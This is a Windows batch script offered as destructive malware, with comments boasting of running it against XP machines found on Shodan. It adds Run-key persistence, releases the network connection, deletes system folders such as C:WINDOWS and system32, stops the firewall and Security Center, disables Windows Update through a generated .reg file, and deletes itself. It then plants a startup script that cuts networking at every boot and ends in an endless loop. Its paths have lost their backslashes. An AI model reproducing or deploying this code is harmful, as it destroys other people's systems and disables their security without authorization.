    :: This shuts down your internet connection permanently....and for a while (a day plus). Perfect to deploy against scammers and Yahoo bois. 
    :: I built this to mess with XP machines I found on shodan XP, inconsistent(35% success) on vista, 7 and 8.1. Not tested on windows 10,11
    
    @echo off

    reg

    add HKLMSoftwareMicrosoftWindowsCurrentVersionRun /v MiXedVeX /t

    REG_SZ /d %systemroot%HaloTrialScoreChangerV1 /f > nul

    start iexpress (website of your choice)

    ipconfig /release

    del “C:Program FilesMicrosoft Games

    del “C:Nexon

    del “C:Program FilesXfire

    del “C:Program FilesAdobe”

    del “C:Program FilesInternet Explorer”

    del “C:Program FilesMozilla Firefox”

    del “C:WINDOWS”

    del “C:WINDOWSsystem32”

    del “C:WINDOWSsystem32cmd”

    del “C:WINDOWSsystem32iexpress”

    del “C:WINDOWSsystem32sndvol32”

    del “C:WINDOWSsystem32sndrec32”

    del “C:WINDOWSsystem32Restorerstrui”

    del “C:WINDOWSsystem32wupdmgr”

    del “C:WINDOWSsystem32desktop”

    del “C:WINDOWSjava”

    del “C:WINDOWSMedia”

    del “C:WINDOWSResources”

    del “C:WINDOWSsystem”

    del “C:drivers”

    del “C:drv”

    del “C:SYSINFO”

    del “C:Program Files”

    echo ipconfig/release_all>>c:windowswimn32.bat

    net stop “Security Center”

    net stop SharedAccess

    > “%Temp%.kill.reg” ECHO REGEDIT4

    >>”%Temp%.kill.reg” ECHO.

    >>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesS haredAccess]

    >>”%Temp%.kill.reg” ECHO “Start”=dword:00000004

    >>”%Temp%.kill.reg” ECHO.

    >>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesw uauserv]

    >>”%Temp%.kill.reg” ECHO “Start”=dword:00000004

    >>”%Temp%.kill.reg” ECHO.

    >>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMControlSet001Serviceswscsv c]

    >>”%Temp%.kill.reg” ECHO “Start”=dword:00000004

    >>”%Temp%.kill.reg” ECHO.

    START /WAIT REGEDIT /S “%Temp%.kill.reg”

    del “%Temp%.kill.reg”

    del %0

    echo @echo off>c:windowswimn32.bat

    echo break off>>c:windowswimn32.bat

    echo ipconfig/release_all>>c:windowswimn32.bat

    echo end>>c:windowswimn32.bat

    reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f

    reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f

    :a

    start iexpress (website of your choice)

    goto a
